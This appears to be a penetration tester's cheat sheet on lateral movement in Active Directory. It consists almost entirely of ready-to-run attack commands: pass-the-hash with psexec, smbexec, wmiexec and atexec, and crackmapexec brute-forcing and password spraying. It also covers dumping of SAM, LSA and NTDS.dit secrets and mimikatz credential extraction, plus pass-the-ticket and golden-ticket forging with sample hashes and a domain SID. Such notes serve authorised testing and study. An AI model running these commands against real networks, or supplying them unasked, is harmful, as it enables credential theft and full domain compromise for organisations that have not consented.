# lateral movement

#### Lateral Movement in Active Directory

#### psexec - smbexec - wmiexec - atexec

* Here we can pass the credentials or even hash, depending on what we have

```bash
[psexec.py](<http://psexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
```

* the user should have write access to Admin share then only we can get session

```bash
[psexec.py](<http://psexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[smbexec.py](<http://smbexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[smbexec.py](<http://smbexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[wmiexec.py](<http://wmiexec.py>) DOMAIN/USERNAME:PASSWORD@TARGET_IP
[wmiexec.py](<http://wmiexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip>  #we passed full hash here
[atexec.py](<http://atexec.py>) -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<username>@<target_ip> "command"  #we passed full hash here
```

#### winrs

```bash
winrs -r:TARGET_IP -u:USERNAME -p:PASSWORD "command"
```

* run this and check whether the user has access on the machine, if you have access then you can get shell
* run this on windows session

#### crackmapexec

* If stuck make use of Wiki

```bash
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp}  #supported services

crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success  # Bruteforce
crackmapexec smb SUBNET_OR_IP -u user.txt -p password.txt --continue-on-success | grep '[+]'  # Filter successful logins
crackmapexec smb SUBNET_OR_IP -u user.txt -p 'password' --continue-on-success  #Password spraying
crackmapexec smb TARGET_IP -u 'user' -p 'password' --shares  #lists all shares, provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --disks
crackmapexec smb DC_IP -u 'user' -p 'password' --users  #we need to provide DC ip
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sessions  #active logon sessions
crackmapexec smb DC_IP -u 'user' -p 'password' --pass-pol  #dumps password policy
crackmapexec smb TARGET_IP -u 'user' -p 'password' --sam  #SAM hashes
crackmapexec smb TARGET_IP -u 'user' -p 'password' --lsa  #dumping lsa secrets
crackmapexec smb DC_IP -u 'user' -p 'password' --ntds  #dumps NTDS.dit file
crackmapexec smb DC_IP -u 'user' -p 'password' --groups {groupname}  #we can also provide --group and it lists all groups
crackmapexec smb TARGET_IP -u 'user' -p 'password' -x 'command'  #For executing commands

#crackmapexec modules
crackmapexec smb -L  #listing modules
crackmapexec smb -M mimikatz --options  #shows the required options for the module
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz  #runs default command
crackmapexec smb TARGET_IP -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug sekurlsa::logonpasswords exit'
```

#### Pass the ticket

```
mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
klist
dir \\\\dc01.corp.local\\c$
```

#### Golden Ticket

```
mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /ptt
misc::cmd
klist
dir \\\\dc01.corp.local\\c$
```

***

